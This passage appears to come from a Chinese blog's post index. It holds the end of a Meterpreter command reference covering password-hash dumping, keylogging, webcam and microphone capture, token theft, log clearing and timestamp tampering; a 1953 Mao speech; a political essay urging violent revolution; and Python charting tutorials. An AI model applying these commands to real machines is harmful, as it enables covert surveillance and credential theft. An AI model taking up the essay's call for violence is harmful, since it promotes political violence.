尝试将权限提升至本地系统权限（SYSTEM） 密码数据库命令（Priv: Password database Commands） 命令 描述 hashdump 导出 SAM 数据库内容（获取系统哈希值） 时间戳篡改命令（Priv: Timestomp Commands） 命令 描述 timestomp 操纵文件的 MACE 属性（修改创建/访问/修改时间） 文件系统命令（Stdapi: File system Commands） 命令 描述 cat 读取文件内容并显示到屏幕 cd 切换目录 checksum 获取文件的校验和（如 MD5/SHA） cp 复制源文件到目标路径 del 删除指定文件 dir 列出文件（ls 的别名） download 下载文件或目录到本地 edit 编辑文件 getlwd 显示本地工作目录（lpwd 的别名） getwd 显示远程工作目录 lcat 读取本地文件内容并显示到屏幕 lcd 切换本地工作目录 ldir 列出本地文件（lls 的别名） lls 列出本地文件 lmkdir 在本地创建新目录 lpwd 显示本地工作目录 ls 列出远程文件 mkdir 在远程创建新目录 mv 移动/重命名文件/目录 pwd 显示远程工作目录（同 getwd） rm 删除指定文件（同 del） rmdir 删除目录 search 搜索远程文件 show_mount 列出所有挂载点/逻辑驱动器 upload 上传本地文件或目录到远程 网络命令（Stdapi: Networking Commands） 命令 描述 arp 显示主机的 ARP 缓存表 getproxy 显示当前代理配置 ifconfig 显示网络接口信息（类 Unix 系统） ipconfig 显示网络接口信息（Windows 系统） netstat 显示网络连接状态（TCP/UDP 端口） portfwd 将本地端口转发到远程服务（端口转发） resolve 在目标主机上解析主机名（DNS 查询） route 查看和修改路由表 系统命令（Stdapi: System Commands） 命令 描述 clearev 清除系统事件日志 drop_token 放弃当前活跃的模拟令牌 execute 执行系统命令 getenv 获取一个或多个环境变量的值 getpid 获取当前 Meterpreter 进程 ID getprivs 尝试启用当前进程可用的所有权限 getsid 获取 Meterpreter 服务端运行用户的 SID getuid 获取 Meterpreter 服务端运行的用户名 kill 终止指定进程 localtime 显示目标系统的本地日期和时间 pgrep 按进程名过滤进程 pkill 按进程名终止进程 ps 列出所有运行中的进程 reboot 重启远程计算机 reg 操作远程注册表（查询/修改/删除键值） rev2self 在远程主机上调用 RevertToSelf()（放弃模拟身份） shell 获取系统命令行 shell（如 cmd/bash） shutdown 关闭远程计算机 steal_token 尝试从目标进程窃取模拟令牌（权限窃取） suspend 暂停或恢复指定进程 sysinfo 获取远程系统信息（如操作系统版本、硬件配置） 用户界面命令（Stdapi: User interface Commands） 命令 描述 enumdesktops 列出所有可访问的桌面和窗口站 getdesktop 获取当前 Meterpreter 附着的桌面 idletime 返回远程用户的空闲时间（秒） keyboard_send 发送键盘输入（模拟按键） keyevent 发送键盘事件（如按下/释放快捷键） keyscan_dump 导出键盘记录缓存（获取已捕获的按键） keyscan_start 开始捕获键盘输入（键盘记录） keyscan_stop 停止捕获键盘输入 mouse 发送鼠标事件（模拟点击/移动） screenshare 实时监控远程用户桌面 screenshot 截取交互式桌面的屏幕截图 setdesktop 切换 Meterpreter 当前附着的桌面 uictl 控制部分用户界面组件（如禁用键盘/鼠标） 摄像头命令（Stdapi: Webcam Commands） 命令 描述 record_mic 从默认麦克风录制 X 秒音频 webcam_chat 启动视频聊天（需远程主机支持） webcam_list 列出所有可用的摄像头 webcam_snap 从指定摄像头拍摄快照（拍照） webcam_stream 播放指定摄像头的实时视频流 音频输出命令（Stdapi: Audio Output Commands） 命令 描述 play 在目标系统上播放波形音频文件（.wav 格式） 补充说明 术语规范： 保持网络安全领域通用译法（如 hashdump 译为“导出 SAM 数据库”而非字面翻译，pivot 译为“跳板监听”符合内网渗透场景） 保留命令原文（如 meterpreter、TLV、SID 等专有名词不翻译） 区分本地/远程操作（前缀 l 表示本地，如 lcd=本地切换目录，cd=远程切换目录） 使用提示： 如需查看某个命令的详细用法，执行 \u0026lt;命令\u0026gt; -h 或 help \u0026lt;命令\u0026gt;（例：portfwd -h） 部分命令依赖系统环境（如 ifconfig 适用于 Linux/Mac，ipconfig 适用于 Windows） 权限相关命令（如 getsystem、hashdump）需要管理员权限才能正常执行 ","date":"2025-12-02T16:59:31+08:00","permalink":"https://www.retr0.xyz/p/meterpreter-%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C%E4%B8%AD%E6%96%87/","title":"Meterpreter 命令手册（中文）"},{"content":" *这是毛泽东同志在一九五三年夏季全国财经工作会议上的讲话。\n（一九五三年八月十二日）\n​\t这次会议开得很好，周总理的结论也作得好。\n​\t现在我们可以看出，在“三反”“五反”运动之后，党内有两种性质的错误。一种是一般性的错误，如“五多”，大家都可能犯，什么时候都可能犯。“五多”的错误也可以变成“五少”的错误。另一种是原则性的错误，如资本主义倾向。这是资产阶级思想在党内的反映，是违背马克思列宁主义的立场问题。\n​\t“三反”“五反”运动，是对党内资产阶级思想的很大打击。但是，当时仅仅给了贪污浪费这方面的资产阶级思想以基本打击，而对在路线问题上反映出来的资产阶级思想并没有解决。这种资产阶级思想，不仅财经工作中有，而且政法、文教和其他工作中也有，中央同志中和地方同志中都有。\n​\t对于财经工作中的错误，从去年十二月薄一波同志提出“公私一律平等”的新税制开始，到这次会议，都给了严肃的批评。新税制发展下去，势必离开马克思列宁主义，离开党在过渡时期的总路线，向资本主义发展。\n​\t过渡时期,是向社会主义发展,还是向资本主义发展？按照党的总路线，是要过渡到社会主义。这是要经过相当长期的斗争的。新税制的错误跟张子善^[1]^的问题不同，是思想问题，是离开了党的总路线的问题。要在党内开展反对资产阶级思想的斗争。就思想状况来说，党内有三种人：有的同志是坚定的,没有动摇的,是马克思列宁主义思想；有一部分同志，基本上是马克思列宁主义，但夹杂着一些非马克思列宁主义的思想；少数人是不好的，是非马克思列宁主义思想。在对薄一波错误思想的批判中,有人说,薄一波的错误是小资产阶级个人主义，这是不妥当的。主要应当批判他有利于资本主义，不利于社会主义的资产阶级思想。这样的批判才是对的。我们说过，“左”倾机会主义错误,是小资产阶级狂热性在党内的反映,那是在和资产阶级决裂时期发生的。在和资产阶级合作的三个时期,就是第一次国共合作时期、抗日战争时期和目前这个时期,都是资产阶级思想影响了党内一部分人，他们动摇了。薄一波的错误,就是在这种情况下犯的。\n注释[1]张子善，曾担任中共天津地委书记，由于受资产阶级腐蚀，堕落成为大贪污犯，在“三反”运动中被判处死刑。\n​\t薄一波的错误，并不是孤立的，不仅在中央有，在大区和省市两级也有。各大区和省市要开一次会，根据七届二中全会的决议和这次会议的结论，检查自己的工作，借以教育干部。\n​\t最近，我去武汉、南京走了一趟,知道了很多情况,很有益处。我在北京,差不多听不到什么,以后还要出外走走。中央领导机关是一个制造思想产品的工厂,如果不了解下情,没有原料，也没有半成品，怎么能够制造出产品？有的东西，地方上已经制成成品，中央领导机关就可以在全国加以推广。比如老“三反”和新“三反”^[2]^，都是地方上先搞的。中央各部乱发指示。本来中央各部发出的东西,应当是上品,现在是次品,并且有大量产品根本没有使用价值,大批报废。大区和省市的领导机关,是制造思想产品的地方工厂,也要出上品。\n注释[2]老“三反”，指一九五一年开展的反对贪污、反对浪费、反对官僚主义的斗争。新“三反”，指一九五三年开展的反对官僚主义、反对命令主义、反对违法乱纪的斗争。\n​\t薄一波的错误，是资产阶级思想的反映。它有利于资本主义，不利于社会主义和半社会主义，违背了七届二中全会的决议。\n​\t我们依靠谁？是依靠工人阶级，还是依靠资产阶级？七届二中全会的决议早已讲清楚了：“必须全心全意地依靠工人阶级”。决议还说，在恢复和发展生产的问题上，必须确定：国营工业生产第一，私营工业生产第二，手工业生产第三。重点是工业，工业中的重点是重工业，这是国营的。在我国目前的五种经济成份中，国营经济是领导成份。资本主义工商业要逐渐引向国家资本主义。\n​\t二中全会决议讲，在发展生产的基础上，改善工人和劳动人民的生活。有资产阶级思想的人，不注意这一点，薄一波就是代表。我们的重点必须放在发展生产上，但发展生产和改善人民生活二者必须兼顾。福利不可不谋，不可多谋，不谋不行。现在，不顾人民生活，不顾人民死活的干部还不少。贵州有一个团曾经占了农民的大量田地，这是严重侵犯人民利益的行为。不顾人民生活是不对的，但是重点还是要放在生产建设上。\n​\t关于利用、限制和改造资本主义经济的问题，二中全会也讲得很清楚。决议上说,对私人资本主义经济,要从活动范围、税收政策、市场价格、劳动条件等方面加以限制,不能任其泛滥。社会主义经济和资本主义经济是领导和被领导的关系。限制和反限制，是新民主主义国家内部阶级斗争的主要形式。现在，新税制讲“公私一律平等”，这就违背了国营经济是领导成份的路线。\n​\t关于个体的农业经济和手工业经济实行合作化的问题，二中全会决议分明说：“这种合作社是以私有制为基础的在无产阶级领导的国家政权管理之下的劳动人民群众的集体经济组织。中国人民的文化落后和没有合作社传统，使得我们的合作社运动的推广和发展大感困难；但是可以组织，必须组织，必须推广和发展。单有国营经济而没有合作社经济，我们就不可能领导劳动人民的个体经济逐步地走上集体化，就不可能由新民主主义国家发展到将来的社会主义国家，就不可能巩固无产阶级在国家政权中的领导权。”这是一九四九年三月的决议，但是相当多的同志不注意,当作新闻,其实是旧闻。薄一波写了《加强党在农村中的政治工作》的文章，他说：个体农民经过互助合作到集体化的道路，“是一种完全的空想,因为目前的互助组是以个体经济为基础的,它不能在这样的基础上逐渐发展到集体农场，更不能经由这样的道路在全体规模上使农业集体化。”这是违反党的决议的。\n​\t现在有两种统一战线,两种联盟。一种是工人阶级和农民的联盟,这是基础。一种是工人阶级和民族资产阶级的联盟。农民是劳动者,不是剥削者,工人阶级和农民的联盟是长期的。但是,工人阶级和农民是有矛盾的。我们应当按照自愿的原则,把农民由个体所有制逐步引导到集体所有制。将来国有制和集体所有制也是有矛盾的。这都是非对抗性的矛盾。工人阶级和资产阶级的矛盾，是对抗性的矛盾。\n​\t资产阶级一定要腐蚀人，用糖衣炮弹打人。资产阶级的糖衣炮弹，有物质的，也有精神的。精神的糖衣炮弹打中了一个靶子，就是薄一波。他的错误，是受了资产阶级思想的影响。宣传新税制的社论，资产阶级拍掌，薄一波高兴了。关于新税制，他事先征求了资产阶级的意见，和资产阶级订了君子协定，却没有向中央报告。当时商业部、供销合作总社不赞成，轻工业部也不满意。财经贸易系统的一百一十万干部和职工，绝大多数是好的，有少数人是不好的。这些不好的人又可以分为两部分：一部分是反革命分子，应当清除；一部分是犯错误的革命者，包括党员和非党工作人员，应当用批评教育的方法来改造他们。\n​\t为了保证社会主义事业的成功，必须在全党，首先在中央、大区和省市这三级党政军民领导机关中，反对右倾机会主义的错误倾向，即反对党内的资产阶级思想。各大区和省市要在适当时机召集有地委书记、专员参加的会议，展开批评讨论，讲清楚社会主义道路和资本主义道路的问题。\n​\t为了保证社会主义事业的成功，必须实行集体领导，反对分散主义，反对主观主义。\n​\t我们现在要反对主观主义,既反对盲目冒进的主观主义,也反对保守的主观主义。过去,在新民主主义革命时期,犯过主观主义的错误,有右的也有“左”的。陈独秀、张国焘是右的,王明是先“左”后右。延安整风的时候,集中反了教条主义,附带反了经验主义,二者都是主观主义。理论与实际不结合,革命就不能胜利。整风解决了这个问题。我们采取惩前毖后、治病救人的方针，是正确的。这次对薄一波实行坚决的彻底的批评，是为了使犯错误的人改正错误，为了保证社会主义的胜利进行。现在是社会主义革命时期，也有主观主义。急躁冒进或保守,都是不按实际情况办事,都是主观主义。不反掉主观主义，革命和建设就不会成功。民主革命时期，对主观主义的错误,用整风的办法解决了,团结了全党执行正确路线的同志和犯过错误的同志,大家从延安出发,奔赴各个战场,全党一个劲,取得了全国胜利。现在,干部比较成熟了，水平提高了,希望不要用很长的时期,基本上把领导工作中的主观主义反掉，努力使主观与客观相适合。\n​\t所有这些问题的解决,关键是巩固集体领导,反对分散主义。我们历来是反对分散主义的。一九四一年二月二日,中央给各中央局、各将领发出指示,规定凡有全国意义的通电、宣言和对内指示,必须事先请示中央。五月间,中央发布了关于统一各根据地对外宣传的指示。同年七月一日，在纪念党成立二十周年的时候,中央发布了关于增强党性的决定,着重反对分散主义。一九四八年,中央发的反对分散主义的指示更多了。一月七日，中央发出了关于建立报告制度的指示；三月，又发了补充指示。同年九月,政治局会议作了关于向中央请示报告制度的决议。九月二十日,中央作了关于健全党委制的决定。一九五三年三月十日,为了避免政府各部门脱离党中央领导的危险,中央作了关于加强对政府工作领导的决定。\n​\t集中与分散是经常矛盾的。进城以来,分散主义有发展。为了解决这个矛盾,一切主要的和重要的问题,都要先由党委讨论决定,再由政府执行。比如,在天安门建立人民英雄纪念碑，拆除北京城墙这些大问题,就是经中央决定，由政府执行的。次要的问题,可以由政府部门的党组去办,一切问题都由中央包下来就不行。反对分散主义,是最得人心的,因为党内大多数同志是关心集体领导的。对待集体领导的态度,党内有三种人：第一种人关心集体领导。第二种人不甚关心,认为党委对他最好不管，管也可以。“最好不管”是缺乏党性，“管也可以”是还有党性。我们要抓他“管也可以”，对缺乏党性要说服教育。不然，各部都各搞各的,中央管不了各部,部长管不了司局长,处长管不了科长,谁也管不了谁,于是王国甚多，八百诸侯。第三种人是极少数，他们坚决反对集体领导。认为最好永远不管。在关于增强党性的决定中,强调要严格实行民主集中制的纪律,少数服从多数,个人服从组织,下级服从上级,全党服从中央（这是多数服从少数,这个少数是代表多数的）。有意见请提,破坏党的团结是最没有脸的。只有靠集体的政治经验和集体的智慧，才能保证党和国家的正确领导，保证党的队伍的不可动摇的团结一致。\n​\t在这次会议上,刘少奇说有那么一点错误,小平同志也说有那么一点错误。无论任何人,犯了错误都要检讨,都要受党的监督,受各级党委的领导,这是完成党的任务的主要条件。全国有很多人,是靠无政府状态吃饭。薄一波就是这样的人。他在政治上思想上有些腐化,批评他是完全必要的。\n​\t最后一点，要提倡谦虚、学习和坚忍的精神。\n​\t要坚忍。如抗美援朝,我们打痛了美帝国主义,打得它相当怕。这对我们建设有利,是我们建设的重要条件。最重要的是,我们的军队受到了锻炼，兵勇、干智。当然，我们牺牲了人,用了钱,付出了代价。但是我们就是不怕牺牲，不干则已，一干就干到底。胡宗南进攻陕甘宁边区，我们的县城只剩下一个,但我们并没有退出边区,吃树叶就吃树叶,就是要有一股狠劲。\n​\t要学习,不要骄傲,不能看不起人。鹅蛋看不起鸡蛋,黑色金属看不起稀有金属,这种看不起人的态度是不科学的。中国是大国,党是大党,也没有理由看不起小国小党。对兄弟国家人民要永远保持学习的态度,要有真正的国际主义精神。在对外贸易方面,有些人骄傲,妄自尊大,这是不对的。要在全党特别要在出国人员中进行教育。要苦学苦干,在十五年或者更长的时间内,基本上完成社会主义工业化和社会主义改造。那时,我国强大了,也要谦虚,永远保持学习的态度。\n​\t七届二中全会有几条规定没有写在决议里面。一曰不作寿。作寿不会使人长寿。主要是要把工作做好。二曰不送礼。至少党内不要送。三曰少敬酒。一定场合可以。四曰少拍掌。不要禁止，出于群众热情，也不泼冷水。五曰不以人名作地名。六曰不要把中国同志和马、恩、列、斯平列。这是学生和先生的关系，应当如此。遵守这些规定，就是谦虚态度。\n​\t总之，要坚持谦虚、学习和坚忍的精神，坚持集体领导的制度，完成社会主义的改造，达到社会主义的胜利。\n","date":"2025-12-01T13:59:29+08:00","permalink":"https://www.retr0.xyz/p/%E5%8F%8D%E5%AF%B9%E5%85%9A%E5%86%85%E7%9A%84%E8%B5%84%E4%BA%A7%E9%98%B6%E7%BA%A7%E6%80%9D%E6%83%B3/","title":"反对党内的资产阶级思想*"},{"content":"编者按：\n1、经常能在网上看到“毒品作为导致近代中华民族身体素质减弱、巨额财富流失和沦为半殖民地半封建社会的毒源”、“中国人把禁毒刻在基因里”等言论来鼓吹民族主义、抹杀背后的阶级矛盾，此次事件中，群众对于假禁毒、真专政行为表示不满，自发性的去声援、关注“发声者”的帐号。\n2、“黄赌毒”等风气的产生不是因为别的，就是因为私有制。这不是靠美帝说的那样靠“发展生产力步入共产主义消灭不良风气”这么“励志”、“天真”就能解决的事情。正是因为存在私人发财的土壤，存在可以剥削残害他人以谋求利益的土壤，毒品才会泛滥成灾。不毁灭私有制，家破人亡的悲剧永远无法彻底得到终结！那些缉毒警察的牺牲永远是白费！无产阶级要看清现实，准备暴力革命推翻现今世界的资本主义制度，在马列毛主义的领导下用无产阶级专政代替它。\n11月27日晚，抖音号“兵团戒毒”发布视频科普2026年1月1日起新规规定吸毒者档案封存，任何单位和个人无权查询。后在半夜时分，“南通文旅”的官方抖音号在该视频评论区评论道：“哪位少爷吸了？”此事迅速引爆全网，南通文旅的官方抖音号粉丝量持续暴涨四百万。28日，兵团戒毒账号删除该视频并且其他视频评论已精选，南通文旅已设置评论区仅作者可评论，仅有共创视频评论区无法设置权限。\n南通文旅的这则可谓是针锋相对的回复，则是将这件事的热度进一步上升。这句话当然不可能是文旅官方的意思，毕竟同属官僚体系，实则是一损俱损的，面对中央的这些个民生载道的法律法规，地方政府就算是获益不大，也绝对不可能敢于与中央政府唱反调。因此，这一评论大概率是运营人员自己的评论。此事发酵到如此程度，整个账号的运营团队估计都没什么好下场。之后，多起地方文旅也是趁机捞取热度，发布一些禁毒向视频打“擦边球”。\n这如此火爆的事件是有很耐人寻味的。首先是这一隐藏档案的规定，无不是将资产阶级的丑恶嘴脸暴露无遗。毒品的危害是巨大的，它能够轻松从生理上彻底摧毁一条生命。英帝用它来打开清朝的封闭市场，荼毒了几代无数半殖民地中国的群众；金三角地带至今都是毒品泛滥的重灾区；墨西哥毒贩的“威名”更是响彻全球，连墨西哥政府都要退避三舍…毒品带来的灾害如此巨大，为什么依然能够长期存在永不杜绝呢？究其根本，是在资本主义私有制社会下，资产阶级对于毒品所带来的巨大利润无法抗拒。\n美帝的喉舌经常以此来贬低美西方帝国主义，转移矛盾抬高美帝，鼓吹美帝的禁毒力度有多么大，如今可算是自己打自己脸了——美帝这是演都不演了。事实上，美帝禁毒力度再大也只是政治权衡下的表面文章：如果说一般的通过私有制劳动关系的剥削是可持续性的竭泽而渔，还会维持再生产，那么毒品就像是一次性掠夺干净无产阶级的剩余价值。资产阶级不傻，不会让其泛滥成灾，遍及全社会，资产阶级本身就是依附于无产阶级而存在的，更可况毒品是群众中的禁忌。但正如前文所说：毒品所带来的巨额利润是资产阶级所不能抗拒的，这就注定了毒品在资本主义社会中不可能完全杜绝。**有利润就有资本，有资本就会有市场，资本家有无数种手段让人去“自愿”消费购买毒品。**毒品从种植、生产到倾销，哪一个环节不是需要严密的组织来执行呢？现实生活中由无数的黑社会、豪强承担这一职责，而其与美帝政府本身就是紧密相连的。\n至于无数牺牲的缉毒警察，大多也是无产阶级和小资产阶级的子女，他们所承受的扭曲逼仄的普通生活、时时刻刻担心自身与家人生命的危机，又与资产阶级有什么关系呢？资产阶级自持专政权，往往只需要学会怎么依靠自身的生产资料、权势地位来压迫、统治无产阶级就行了。因此美帝颁布这项法规，实则是极为正常的。再多的缉毒警擦也不可能杜绝毒品的肆虐横行，因为祸根脱不开资本主义。\n反观新中国，成立之后短短几年就在全国范围内解决毒品问题，享誉“世界无毒国”的美名，甚至帮助数百万受毒品璀璨的人通过劳动与政治挂帅的改造解决毒品危害。正是改革开放后，无产阶级再次失去了专政权，黄赌毒再一次肆虐。\n不论是南通文旅运营团队中说出这句话的人，还是网上无数舆论声援的网友，实际上都说明了群众对于美帝愈发的不满，可以说无产阶级对资产阶级的怒火早已愈烧俞烈。但资本主义社会之下，无产阶级的怒火也只会导向自发的经济斗争，例如佳士运动，最终的结果是不可能对美帝的国家机器造成什么实质性的伤害。\n","date":"2025-12-01T09:52:45+08:00","image":"https://www.retr0.xyz/post/%E9%9A%8F%E7%AC%94/img/1.2-0.jpg","permalink":"https://www.retr0.xyz/p/%E5%90%B8%E6%AF%92%E6%A1%A3%E6%A1%88%E5%B0%81%E5%AD%98--%E8%B5%84%E6%9C%AC%E4%B8%BB%E4%B9%89%E7%A4%BE%E4%BC%9A%E7%9A%84%E6%97%A0%E4%BA%A7%E9%98%B6%E7%BA%A7%E7%BE%A4%E4%BC%97%E5%87%BA%E8%B7%AF%E4%BD%95%E5%9C%A8/","title":"吸毒档案封存--资本主义社会的无产阶级群众出路何在"},{"content":"数据准备 资料获取 接下来的几个练习所用数据都在这里，请自行下载：\n链接: https://pan.baidu.com/s/1b5ZZ5cVyS-9_06tql4tNFw 提取码: i3i6\n分析文件 我们任选一个文件打开分析（此处以美国.txt为例）\n文件大致为jsonp_1629344292311_69436({\u0026quot;status\u0026quot;:0,\u0026quot;msg\u0026quot;:\u0026quot;success\u0026quot; 。。。。。。32695,271457,169842]}]}}]});\n发现此文件内容并不完全符合json格式，存在以下两点问题：\n开头的花括号前多出来了jsonp_1629344292311_69436(部分 结尾多了出了括号和分号); 接下来为例便于查看json的层级结构，我们打开工具网站：JSON在线视图查看器(Online JSON Viewer)将上面文本中间去头去尾符合正确json格式的部分复制到左面的输入框，点击格式化按钮，这时右面已经出现了便于查看的结构树，如图：\n也可以参考下面给出的省略版：\n总体可以看出其中，\u0026ldquo;update\u0026quot;中和下面的\u0026quot;data\u0026quot;中的数据应该具有对应关系\n开始操作 为了方便演示，将三个国家分开操作，因此可以将任务总共分为下面几步：\n打开并读取文件 去掉不合json规范的开头 去掉不合json规范的结尾 json转python字典 获取trend key 获取日期数据，用于x轴，取2020年（到314下标结束） 获取确诊数据，用于y轴，取2020年（到314下标结束） 生成图表 分块演示 以美国.txt为例。\n1 2 3 # 打开并读取文件 usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() 打开美国.txt文件查看发现开头要删除的内容为：jsonp_1629344292311_69436(\n根据前面所学的6.3 数据容器：字符串中2.2 节字符串的替换，我们这里使用replace()函数处理\n1 us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) 接下来的结尾不能也用replace()，因为在文件中可能有多处出现了);，会出现多处替换的情况，因此我们使用字符串的切片，详见6.4 序列的操作：切片\n1 us_data = us_data[:-2] 下面导入json模块将字符串转为字典\n1 2 import json us_dict = json.loads(us_data) 下面回到浏览器，根据json视图一点点获取层级数据\n1 us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] 目前剩下的结构\n1 2 3 JSON ├─list(字典，格式为0:\u0026#34;2.22\u0026#34;,1:\u0026#34;2.23\u0026#34;) └─updateDate 下面我们获取日期数据\n1 us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] 然后获取确诊数据\n1 us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] 最后构建图表\n1 2 3 4 5 6 7 8 9 10 # 导包，导入Line功能构建折线图对象 from pyecharts.charts import Line # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis(us_x_data) # 添加y轴数据 line.add_yaxis(\u0026#34;确诊人数\u0026#34;, us_y_data) # 生成图表 line.render() 单国完整版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import json from pyecharts.charts import Line usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) us_data = us_data[:-2] us_dict = json.loads(us_data) us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] line = Line() line.add_xaxis(us_x_data) line.add_yaxis(\u0026#34;确诊人数\u0026#34;, us_y_data) line.render() 终极版(成品) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import json from pyecharts.charts import Line from pyecharts.options import * usdoc = open(\u0026#39;T:/美国.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) indoc = open(\u0026#39;T:/印度.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) jpdoc = open(\u0026#39;T:/日本.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) us_data = usdoc.read() in_data = indoc.read() jp_data = jpdoc.read() us_data = us_data.replace(\u0026#39;jsonp_1629344292311_69436(\u0026#39;,\u0026#39;\u0026#39;) in_data = in_data.replace(\u0026#39;jsonp_1629350745930_63180(\u0026#39;,\u0026#39;\u0026#39;) jp_data = jp_data.replace(\u0026#39;jsonp_1629350871167_29498(\u0026#39;,\u0026#39;\u0026#39;) us_data = us_data[:-2] in_data = in_data[:-2] jp_data = jp_data[:-2] us_dict = json.loads(us_data) in_dict = json.loads(in_data) jp_dict = json.loads(jp_data) us_trend = us_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] in_trend = in_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] jp_trend = jp_dict[\u0026#39;data\u0026#39;][0][\u0026#39;trend\u0026#39;] us_x_data = us_trend[\u0026#39;updateDate\u0026#39;][:314] us_y_data = us_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] in_y_data = in_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] jp_y_data = jp_trend[\u0026#39;list\u0026#39;][0][\u0026#39;data\u0026#39;][:314] line = Line() line.add_xaxis(us_x_data) line.add_yaxis(\u0026#34;美国确诊\u0026#34;, us_y_data) line.add_yaxis(\u0026#34;印度确诊\u0026#34;, in_y_data) line.add_yaxis(\u0026#34;日本确诊\u0026#34;, jp_y_data) line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;2020年美印日确诊人数趋势\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_top=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 ) line.render() ","date":"2025-12-01T08:35:56+08:00","permalink":"https://www.retr0.xyz/p/10.3-%E7%BB%83%E4%B9%A0%E4%B8%80%E6%8A%98%E7%BA%BF%E5%9B%BE/","title":"10.3 练习一：折线图"},{"content":"json 数据格式 什么是json JSON是一种轻量级的数据交互格式。可以按照JSON指定的格式去组织和封装数据 JSON本质上是一个带有特定格式的字符串 **主要功能：**json就是一种在各个编程语言中流通的数据格式，负责不同编程语言中的数据传递和交互。\njson有什么用 各种编程语言存储数据的容器不尽相同，在Python中有字典dict这样的数据类型，而其它语言可能没有对应的字典。 为了让不同的语言都能够相互通用的互相传递数据，JSON就是一种非常良好的中转数据格式。如下图，以Python和C语言互传数据为例：\njson格式数据转化 json格式的数据要求很严格，如下面所示：\n1 2 3 4 5 # json数据的格式可以是(类字典)： {\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;age\u0026#34;:18} # 也可以是(类列表嵌套字典)： [{\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;age\u0026#34;:18},{\u0026#34;name\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;retr0\u0026#34;,\u0026#34;age\u0026#34;:20}] Python数据和json数据的相互转化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 导入json模块 import json # 准备符合json格式要求的python数据 data = [{\u0026#34;name\u0026#34;:\u0026#34;张三\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;李四\u0026#34;,\u0026#34;age\u0026#34;:20}] # 通过json.dumps(data)方法把python数据转化为了json数据 json1 = json.dumps(data) # 通过json.loads(json1)方法把json数据转化为了python数据 data1 = json.loads(json1) print(data,\u0026#34;类型为\u0026#34;,type(data)) print(json1,\u0026#34;类型为\u0026#34;,type(json1)) print(data1,\u0026#34;类型为\u0026#34;,type(data1)) **注意：**中文内容在转换为json时会出现编码问题，因此需要在json.dumps()中添加参数ensure_ascii=False，如下所示：\n1 2 3 4 import json data = [{\u0026#34;name\u0026#34;:\u0026#34;张三\u0026#34;,\u0026#34;age\u0026#34;:16},{\u0026#34;name\u0026#34;:\u0026#34;李四\u0026#34;,\u0026#34;age\u0026#34;:20}] json1 = json.dumps(data,ensure_ascii=False) print(json1) pyecharts 入门 基础折线图 Quickstart：\n1 2 3 4 5 6 7 8 9 10 # 导包，导入Line功能构建折线图对象 from pyecharts.charts import Line # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) # 添加y轴数据 line.add_yaxis(\u0026#34;GDP\u0026#34;,[30,20,10]) # 生成图表 line.render() 输出了文件render.html我们打开，如图所示：\n全局配置 通过全局配置我们可以修改图标的标题，图例，工具箱，视觉映射，鼠标悬浮提示框，区域缩放等配置项\n设置全局配置项set_global_opts来设置\n所以我们要额外导入pyecharts的一个方法\u0026quot;options\u0026quot;\n1 from pyecharts.options import * 例如：\n1 2 3 4 5 6 7 8 9 line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;GDP展示\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_bottom=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 visualmap_opts=VisualMapOpts(is_show=True), ) 此处仅展示部分，更多请查看官方文档全局配置项 - pyecharts - Python Echarts Plotting Library built with love.\n现在我们将上面的两部分代码整合起来：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pyecharts.charts import Line from pyecharts.options import * # 得到折线图对象 line = Line() # 添加x轴数据 line.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) # 添加y轴数据 